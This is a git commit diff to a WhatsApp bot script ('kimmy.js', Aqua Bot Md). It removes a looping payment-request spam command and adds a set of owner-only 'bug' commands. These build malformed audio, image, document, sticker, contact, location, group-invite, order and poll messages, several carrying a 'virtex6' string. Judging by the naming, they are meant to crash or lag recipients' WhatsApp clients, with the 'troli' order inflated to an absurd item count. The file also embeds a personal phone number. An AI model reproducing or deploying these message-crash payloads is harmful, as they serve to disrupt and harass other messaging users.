365f206e13828d9d5cf5b59e69acdfed644a50d2
Takim <93022529+takimtod@users.noreply.github.com>
2022-09-10 17:44:55 +0800

    Add files via upload

--- kimmy.js
+++ kimmy.js
@@ -3831,29 +3831,239 @@ aqua.sendImageAsSticker2(m.chat, teks, m)
 })
 }
 db.users[sender].limit -= 1 // -1 limit
-break	
+break
 
-case 'santetdia': {
-if (!isOwner) return reply ('khsus owner')
-if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
-num = q.split('|')[0]
-jumlah = q.split('|')[1]
-for (let i = 0; i < jumlah; i++) {
-reply(`baiklah tuan`)
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
-"requestPaymentMessage": {
-"currencyCodeIso4217": "IDR",
-"amount1000": "100",
-"extendedTextMessage": {
-"text": `MY DEVELOPER Paww 1981`,
+	
+//CASE BUGG BY HAIKALL
+case 'bug1': {
+if (!isOwner) return reply (mess.owner)
+var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"audioMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
+"mimetype": "audio/mpeg",
+"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
+"fileLength": "258330",
+"seconds": 16,
+"ptt": false,
+"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
+"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
+"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
+"mediaKeyTimestamp": "1657190832",
 }
-}}), { userJid: m.chat, quoted: doc})
-aqua.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-}
-reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 break
+//=================================================//
+case 'bug2': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"imageMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
+"mimetype": "image/jpeg",
+"caption": `Aqua Bot Md${virtex6}`,
+"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
+"fileLength": "42521",
+"height": 426,
+"width": 640,
+"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
+"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
+"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
+"mediaKeyTimestamp": "1657286523",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, image.message, { messageId: image.key.id })
+}
+break
+//=================================================//
+case 'bug3': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
+"mimetype": "application/octet-stream",
+"title": ".dev",
+"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
+"pageCount": 0,
+"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
+"fileName": `Aqua Bot Md${virtex6}`,
+"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
+"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
+"mediaKeyTimestamp": "1657288637",
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, document.message, { messageId: document.key.id })
+}
+break
+//=================================================//
+case 'bug4': {
+if (!isOwner) return reply (mess.owner)
+var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"extendedTextMessage": {
+"text": `https://chat.whatsapp.com/DaBXFf82aqwHc03v22E09D\n\n© Aqua Bot Md`,
+"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
+"description": "Undangan Grup WhatsApp",
+"title": `Aqua Bot Md${virtex6}`,
+"previewType": "NONE",
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
+}
+break
+//=================================================//
+case 'bug5': {
+if (!isOwner) return reply (mess.owner)
+var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 64,
+"width": 64,
+"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
+"fileLength": "7774",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
+}
+break
+//=================================================//
+case 'bug6': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"extendedTextMessage": {
+"text": "https://wa.me/c/628388024064",
+"matchedText": "https://wa.me/c/628388024064",
+"description": "Developer Aqua Bot Md\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
+"title": `Aqua Bot Md${virtex6}`,
+"previewType": "NONE",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
+}
+break
+//=================================================//
+case 'bug7': {
+if (!isOwner) return reply (mess.owner)
+var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"contactMessage": {
+"displayName": `Aqua Bot Md${virtex6}`,
+"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:Haikal\nitem1.TEL;waid=50767666664:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer Paww 1981WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
+}
+break
+//=================================================//
+case 'buglokasi2': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"liveLocationMessage": {
+"degreesLatitude": -6.9367014,
+"degreesLongitude": 107.7228574,
+"caption": `Aqua Bot Md${virtex6}`,
+"sequenceNumber": "1657237469254001",
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
+}
+break
+case 'buglokasi1': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"locationMessage": {
+"degreesLatitude": -6.936928157735237,
+"degreesLongitude": 107.72270679473877,
+"caption": `Aqua Bot Md${virtex6}`,
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, location.message, { messageId: location.key.id })
+}
+break
+//=================================================//
+case 'buginvite': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"groupInviteMessage": {
+"groupJid": "85296556573-1328272333@g.us",
+"inviteCode": "wFHwtOxGQN8OwK2x",
+"inviteExpiration": ` Aqua Bot Md${virtex6}`,
+"groupName": ` Aqua Bot Md${virtex6}`,
+"caption": `${virtex6}`,
+"jpegThumbnail": messa.imageMessage,
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
+}
+break
+//=================================================//
+case 'troli': {
+if (!isOwner) return reply (mess.owner)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/thumb.jpg') }, { upload: aqua.waUploadToServer })
+var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+ "orderMessage": {
+"orderId": "449756950375071",
+"orderImage": messa.imageMessage,
+"itemCount": 100000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `Aqua Bot Md${virtex6}`,
+"jpegThumbnail":fs.readFileSync('./media/thumb.jpg'),
+"orderTitle": `Aqua Bot Md${virtex6}`,
+"sellerJid": "50767666664@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "500000000000000",
+"totalCurrencyCode": "IDR",
+}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+break
+
+case 'poll': {
+if (!isOwner) return
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "TES KEBALL NIII",
+"options": [
+	{
+"optionName": "KATANYA WA KEBAL"
+	},
+	{
+"optionName": "BERANI VOTE GA"
+	},
+	{
+"optionName": "VOTE SEMUANYA DONG"
+	},
+	{
+"optionName": "KATANYA KEBAL"
+	},
+	{
+"optionName": "Bot WhatsApp⁰⁵"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+aqua.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+//reply('sukses sendbug')
+}
+break
+
 case 'santetgc': {
 if (!isOwner) return reply ('khsus owner')
 if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
